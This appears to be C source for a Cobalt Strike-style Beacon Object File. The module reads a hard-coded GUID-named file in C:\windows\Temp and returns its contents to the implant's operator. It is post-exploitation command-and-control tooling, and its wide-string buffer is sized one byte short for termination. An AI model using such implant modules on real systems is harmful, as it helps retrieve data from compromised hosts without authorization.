#include "ReadFile.h"


void go(char * args, int len) {
    HANDLE hFile = NULL;
    DWORD bytesRead = 0;
    BOOL readResult = FALSE;
    wchar_t* buffer = NULL;

    hFile = CreateFileW_(L"C:\\windows\\Temp\\{7C6A0555-C7A9-4E26-9744-5C2526EA3039}.dat", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Could not open file, error: %d", GetLastError());
        goto cleanup;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        BeaconPrintf(CALLBACK_ERROR, "Could not get file size, error: %d", GetLastError());
        goto cleanup;
    }

    buffer = (wchar_t*)LocalAlloc_(LPTR, fileSize + 1);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed, error: %d", GetLastError());
        goto cleanup;
    }

    memset(buffer, 0, fileSize + 1);

    readResult = ReadFile_(hFile, buffer, fileSize, &bytesRead, NULL);

    if (!readResult || bytesRead != fileSize) {
        BeaconPrintf(CALLBACK_ERROR, "Could not read file, error: %d", GetLastError());
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%ls", buffer);

    cleanup:
        if (hFile)
            CloseHandle_(hFile);
        if (buffer) {
            if (fileSize != 0 ) memset(buffer, 0, fileSize + 1);
            LocalFree_(buffer);
        }
}
